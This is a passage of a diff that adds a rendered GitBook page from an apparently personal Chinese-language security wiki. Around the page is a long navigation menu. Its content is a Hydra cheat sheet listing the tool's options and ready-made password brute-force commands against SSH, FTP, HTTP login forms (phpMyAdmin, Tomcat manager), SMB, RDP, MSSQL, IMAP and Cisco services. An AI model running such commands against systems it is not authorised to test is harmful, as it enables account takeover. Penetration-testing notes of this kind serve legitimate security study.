+        </li>
+    
+        <li class="chapter " data-level="1.4.27" data-path="../WebSecurity/path_collect.html">
+            
+                <a href="../WebSecurity/path_collect.html">
+            
+                    
+                    文件读取漏洞路径收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.28" data-path="../WebSecurity/解析漏洞.html">
+            
+                <a href="../WebSecurity/解析漏洞.html">
+            
+                    
+                    解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    Kali2
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="beef.html">
+            
+                <a href="beef.html">
+            
+                    
+                    Beef
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="burpsuite.html">
+            
+                <a href="burpsuite.html">
+            
+                    
+                    BurpSuite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="code_editor.html">
+            
+                <a href="code_editor.html">
+            
+                    
+                    Code editor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="gather-information.html">
+            
+                <a href="gather-information.html">
+            
+                    
+                    Gather Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.5.5" data-path="hydra.html">
+            
+                <a href="hydra.html">
+            
+                    
+                    Hydra
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="mitmproxy.html">
+            
+                <a href="mitmproxy.html">
+            
+                    
+                    MitmProxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="pyenv.html">
+            
+                <a href="pyenv.html">
+            
+                    
+                    Pyenv
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="remote.html">
+            
+                <a href="remote.html">
+            
+                    
+                    Remote access
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="shell.html">
+            
+                <a href="shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="tmux.html">
+            
+                <a href="tmux.html">
+            
+                    
+                    Tmux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="w3af.html">
+            
+                <a href="w3af.html">
+            
+                    
+                    W3af
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="install&configure.html">
+            
+                <a href="install&configure.html">
+            
+                    
+                    install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="phpmyadmin.html">
+            
+                <a href="phpmyadmin.html">
+            
+                    
+                    phpmyadmin install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="flow_analysis.html">
+            
+                <a href="flow_analysis.html">
+            
+                    
+                    流量监听
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    Vuln
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Vuln/joomla.html">
+            
+                <a href="../Vuln/joomla.html">
+            
+                    
+                    Joomla
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../PHP/function.html">
+            
+                <a href="../PHP/function.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../PHP/configure.html">
+            
+                <a href="../PHP/configure.html">
+            
+                    
+                    configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../PHP/note.html">
+            
+                <a href="../PHP/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../PHP/正则匹配.html">
+            
+                <a href="../PHP/正则匹配.html">
+            
+                    
+                    正则匹配
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    Docker
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../Docker/docker-compose.html">
+            
+                <a href="../Docker/docker-compose.html">
+            
+                    
+                    Docker Compose
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../Docker/dockerfile.html">
+            
+                <a href="../Docker/dockerfile.html">
+            
+                    
+                    Dockerfile
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../Docker/docker-api-in-python.html">
+            
+                <a href="../Docker/docker-api-in-python.html">
+            
+                    
+                    docker api in python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../Docker/locale.html">
+            
+                <a href="../Docker/locale.html">
+            
+                    
+                    locale
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../Docker/note.html">
+            
+                <a href="../Docker/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../Docker/openvpn.html">
+            
+                <a href="../Docker/openvpn.html">
+            
+                    
+                    openvpn
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../Docker/安装和基本命令.html">
+            
+                <a href="../Docker/安装和基本命令.html">
+            
+                    
+                    安装和基本命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.8" data-path="../Docker/常用开发环境.html">
+            
+                <a href="../Docker/常用开发环境.html">
+            
+                    
+                    常用开发环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.9" data-path="../Docker/微容器.html">
+            
+                <a href="../Docker/微容器.html">
+            
+                    
+                    微容器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.10" data-path="../Docker/心得.html">
+            
+                <a href="../Docker/心得.html">
+            
+                    
+                    心得
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.11" data-path="../Docker/持续集成与自动发布.html">
+            
+                <a href="../Docker/持续集成与自动发布.html">
+            
+                    
+                    持续集成与自动发布
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    HTTP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../HTTP/cookie.html">
+            
+                <a href="../HTTP/cookie.html">
+            
+                    
+                    Cookie
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../HTTP/encode_and_decode.html">
+            
+                <a href="../HTTP/encode_and_decode.html">
+            
+                    
+                    Encode and Decode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../HTTP/http请求格式.html">
+            
+                <a href="../HTTP/http请求格式.html">
+            
+                    
+                    HTTP请求格式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../HTTP/proxy.html">
+            
+                <a href="../HTTP/proxy.html">
+            
+                    
+                    Proxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../HTTP/xpath.html">
+            
+                <a href="../HTTP/xpath.html">
+            
+                    
+                    XPATH
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" >
+            
+                <span>
+            
+                    
+                    Git
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../Git/gist.html">
+            
+                <a href="../Git/gist.html">
+            
+                    
+                    Gist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../Git/git.html">
+            
+                <a href="../Git/git.html">
+            
+                    
+                    git
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.3" data-path="../Git/git_remote_operation.html">
+            
+                <a href="../Git/git_remote_operation.html">
+            
+                    
+                    git remote operation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" >
+            
+                <span>
+            
+                    
+                    Image
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.11.1" data-path="../Image/png.html">
+            
+                <a href="../Image/png.html">
+            
+                    
+                    PNG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" >
+            
+                <span>
+            
+                    
+                    JS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../JS/xhr.html">
+            
+                <a href="../JS/xhr.html">
+            
+                    
+                    XHR
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" >
+            
+                <span>
+            
+                    
+                    Note
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../Note/ctf.html">
+            
+                <a href="../Note/ctf.html">
+            
+                    
+                    CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../Note/elk.html">
+            
+                <a href="../Note/elk.html">
+            
+                    
+                    ELK
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.3" data-path="../Note/google-hacking.html">
+            
+                <a href="../Note/google-hacking.html">
+            
+                    
+                    Google Hacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.4" data-path="../Note/sql.html">
+            
+                <a href="../Note/sql.html">
+            
+                    
+                    Sql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.5" data-path="../Note/mysql.html">
+            
+                <a href="../Note/mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.6" data-path="../Note/same-origin-policy.html">
+            
+                <a href="../Note/same-origin-policy.html">
+            
+                    
+                    same origin policy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.7" data-path="../Note/software.html">
+            
+                <a href="../Note/software.html">
+            
+                    
+                    software
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" >
+            
+                <span>
+            
+                    
+                    AWS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../AWS/note.html">
+            
+                <a href="../AWS/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" >
+            
+                <span>
+            
+                    
+                    Python3
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../Python3/string.html">
+            
+                <a href="../Python3/string.html">
+            
+                    
+                    String
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16" >
+            
+                <span>
+            
+                    
+                    Simiki
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.16.1" data-path="../Simiki/simiki-命令.html">
+            
+                <a href="../Simiki/simiki-命令.html">
+            
+                    
+                    simiki 命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.2" data-path="../Simiki/start with github page.html">
+            
+                <a href="../Simiki/start with github page.html">
+            
+                    
+                    start github page
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Hydra</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="0x00-hydra">0x00 hydra</h2><p>hydra&#x662F;&#x8457;&#x540D;&#x9ED1;&#x5BA2;&#x7EC4;&#x7EC7;thc&#x7684;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x66B4;&#x529B;&#x5BC6;&#x7801;&#x7834;&#x89E3;&#x5DE5;&#x5177;,&#x652F;&#x6301;&#x7834;&#x89E3;&#x591A;&#x79CD;&#x5BC6;&#x7801;&#x3002;</p><h2 id="0x01-option">0x01 option</h2><pre><code>-R          &#x7EE7;&#x7EED;&#x4ECE;&#x4E0A;&#x4E00;&#x6B21;&#x8FDB;&#x5EA6;&#x63A5;&#x7740;&#x7834;&#x89E3;
+-S          &#x91C7;&#x7528;SSL&#x94FE;&#x63A5;
+-s &lt;PORT&gt;   &#x53EF;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x975E;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;
+-l &lt;LOGIN&gt;  &#x6307;&#x5B9A;&#x7834;&#x89E3;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5BF9;&#x7279;&#x5B9A;&#x7528;&#x6237;&#x7834;&#x89E3;
+-L &lt;FILE&gt;   &#x6307;&#x5B9A;&#x7528;&#x6237;&#x540D;&#x5B57;&#x5178;
+-p &lt;PASS&gt;   &#x6307;&#x5B9A;&#x5BC6;&#x7801;&#x7834;&#x89E3;&#xFF0C;&#x5C11;&#x7528;&#xFF0C;&#x4E00;&#x822C;&#x662F;&#x91C7;&#x7528;&#x5BC6;&#x7801;&#x5B57;&#x5178;
+-P &lt;FILE&gt;   &#x6307;&#x5B9A;&#x5BC6;&#x7801;&#x5B57;&#x5178;
+-e &lt;nsr&gt;     &#x989D;&#x5916;&#x53EF;&#x9009;&#x9009;&#x9879;&#xFF0C;n (&#x7A7A;&#x5BC6;&#x78BC;&#xFF0C;&#x5373;&#x4E0D;&#x6307;&#x5B9A;&#x5BC6;&#x78BC;)&#xFF0C; s (&#x5C07;&#x5E33;&#x865F;&#x540C;&#x6642;&#x7576;&#x6210;&#x5BC6;&#x78BC;&#x7528;)&#xFF0C;r (&#x5C07;&#x5E33;&#x865F;/&#x5BC6;&#x78BC;&#x8ABF;&#x63DB;&#x4F7F;&#x7528;)
+-C &lt;FILE&gt;   &#x4F7F;&#x7528;&#x5192;&#x53F7;&#x5206;&#x5272;&#x683C;&#x5F0F;&#xFF0C;&#x4F8B;&#x5982;&#x201C;&#x767B;&#x5F55;&#x540D;:&#x5BC6;&#x7801;&#x201D;&#x6765;&#x4EE3;&#x66FF;-L/-P&#x53C2;&#x6570;
+-M &lt;FILE&gt;   &#x6307;&#x5B9A;&#x76EE;&#x6807;&#x5217;&#x8868;&#x6587;&#x4EF6;&#x4E00;&#x884C;&#x4E00;&#x6761;
+-o &lt;FILE&gt;   &#x6307;&#x5B9A;&#x7ED3;&#x679C;&#x8F93;&#x51FA;&#x6587;&#x4EF6;
+-f          &#x5728;&#x4F7F;&#x7528;-M&#x53C2;&#x6570;&#x4EE5;&#x540E;&#xFF0C;&#x627E;&#x5230;&#x7B2C;&#x4E00;&#x5BF9;&#x767B;&#x5F55;&#x540D;&#x6216;&#x8005;&#x5BC6;&#x7801;&#x7684;&#x65F6;&#x5019;&#x4E2D;&#x6B62;&#x7834;&#x89E3;
+-t &lt;TASKS&gt;  &#x540C;&#x65F6;&#x8FD0;&#x884C;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;16
+-w &lt;TIME&gt;   &#x8BBE;&#x7F6E;&#x6700;&#x5927;&#x8D85;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x79D2;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;30s
+-v / -V     &#x663E;&#x793A;&#x8BE6;&#x7EC6;&#x8FC7;&#x7A0B;
+-SuvVd46&#xFF1A;&#x662F;&#x591A;&#x500B;&#x9078;&#x9805;&#x7684;&#x7D44;&#x5408;&#xFF0C;&#x5206;&#x5225;&#x8868;&#x793A;&#xFF1A;
+    S&#xFF1A;&#x4F7F;&#x7528;SSL&#x9023;&#x7DDA;
+    u&#xFF1A;&#x6BCF;&#x4E00;&#x7D44;&#x5BC6;&#x78BC;&#x90FD;&#x7528;&#x5E33;&#x865F;&#x8F2A;&#x6D41;&#x6E2C;&#x8A66;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x4E00;&#x7D44;&#x5E33;&#x865F;&#x7528;&#x5BC6;&#x78BC;&#x8F2A;&#x6D41;&#x6E2C;&#x8A66;&#x3002;
+    v V d U &#x662F;&#x8A0A;&#x606F;&#x7684;&#x8A73;&#x7D30;&#x5EA6;
+    4 6 &#x662F; IP address &#x683C;&#x5F0F;(IPv4 &#x6216; IPv6)
+server      &#x76EE;&#x6807;ip
+service     &#x6307;&#x5B9A;&#x670D;&#x52A1;&#x540D;&#xFF0C;&#x652F;&#x6301;&#x7684;&#x670D;&#x52A1;&#x548C;&#x534F;&#x8BAE;&#xFF1A;telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp&#x7B49;&#x7B49;</code></pre>
+<h2 id="0x02-use-demo">0x02 use demo</h2><h3 id="ssh"><code>ssh</code></h3><pre><code>hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns ip ssh
+hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -o save.log -vV ip ssh</code></pre>
+<h3 id="ftp"><code>ftp</code></h3><pre><code>hydra ip ftp -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B;(&#x9ED8;&#x8BA4;16) -vV
+hydra ip ftp -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -e ns -vV</code></pre>
+<h3 id="http">http</h3><ul><li>http post form attack
+</li></ul>
+<pre><code>hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form &#x201C;/login.php:name=^USER^&amp;pwd=^PASS^:incorrect:H=Cookie: security=low; PHPSESSID=o7qiqd9fc1d003u9d38k64t0f4&#x201D;
+hydra -l admin -P passwords.lst -e ns -vV 192.168.2.10 http-post-form &quot;/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^&amp;server=1:denied&quot;
+hydra -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;
+hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot;</code></pre>
+<blockquote><p>http-post-form or http-get-form</p><p>incorrect&#x8868;&#x793A;&#x9519;&#x8BEF;&#x731C;&#x89E3;&#x7684;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x63D0;&#x793A;&#xFF0C;&#x81EA;&#x5B9A;&#x4E49;,&#x6700;&#x597D;&#x548C;&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x4E00;&#x81F4;&#xFF0C;&#x4E0D;&#x8981;&#x7565;&#x5199;&#xFF0C;&#x4E0D;&#x7136;&#x53EF;&#x80FD;&#x4EA7;&#x751F;&#x9519;&#x62A5;&#xFF0C;&#x5177;&#x4F53;&#x539F;&#x56E0;&#x5F85;&#x53BB;&#x770B;&#x6E90;&#x7801;</p></blockquote><p><strong>:H= &#x8868;&#x793A;&#x624B;&#x5DE5;&#x8BBE;&#x7F6E;&#x7684;Header</strong></p><ul><li>http get
+</li></ul>
+<pre><code>hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns ip http-get /admin/
+hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns -f ip http-get /admin/index.php</code></pre>
+<p>&#x6BD4;&#x5982;&#x7206;&#x7834;&#x767B;&#x9646;&#x5BC6;&#x7801;:</p><p><code>phpmyadmin</code></p><pre><code>hydra -l root -P /root/pwd.lst -e ns -vV -f 192.168.32.6 http-get /phpmyadmin/</code></pre>
+<p><code>tomcat</code></p><pre><code>hydra -l tomcat -P /root/top50000 -t 16 -ens -f -vV 192.168.32.6 -s 8081 http-get /manager/html</code></pre>
+<h3 id="https"><code>https</code></h3><pre><code>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</code></pre>
+<h3 id="teamspeak"><code>teamspeak</code></h3><pre><code>hydra -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -s &#x7AEF;&#x53E3;&#x53F7; -vV ip teamspeak</code></pre>
+<h3 id="cisco"><code>cisco</code></h3><pre><code>hydra -P pass.txt 10.36.16.18 cisco
+hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</code></pre>
+<h3 id="smb"><code>smb</code></h3><pre><code>hydra -l administrator -P pass.txt 10.36.16.18 smb</code></pre>
+<h3 id="pop3"><code>pop3</code></h3><pre><code>hydra -l muts -P pass.txt my.pop3.mail pop3</code></pre>
+<h3 id="rdp"><code>rdp</code></h3><pre><code>hydra ip rdp -l administrator -P pass.txt -V</code></pre>
+<h3 id="http-proxy"><code>http-proxy</code></h3><pre><code>hydra -l admin -P pass.txt http-proxy://10.36.16.18</code></pre>
+<h3 id="imap"><code>imap</code></h3><pre><code>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</code></pre>
+<h3 id="mssql"><code>mssql</code></h3><pre><code>hydra -l sa -P /root/Password/pass.txt mssql://192.168.1.11 -o ok.txt</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="gather-information.html" class="navigation navigation-prev " aria-label="Previous page: Gather Information">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="mitmproxy.html" class="navigation navigation-next " aria-label="Next page: MitmProxy">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Hydra","date":"2016-07-10 14:18","level":"1.5.5","depth":2,"next":{"title":"MitmProxy","level":"1.5.6","depth":2,"path":"Kali2/mitmproxy.md","ref":"Kali2/mitmproxy.md","articles":[]},"previous":{"title":"Gather Information","level":"1.5.4","depth":2,"path":"Kali2/gather-information.md","ref":"Kali2/gather-information.md","articles":[]},"dir":"ltr"},"config":{"plugins":["livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0"},"file":{"path":"Kali2/hydra.md","mtime":"2016-08-16T14:00:50.453Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-08-16T16:38:45.378Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
     </body>
 </html>
+
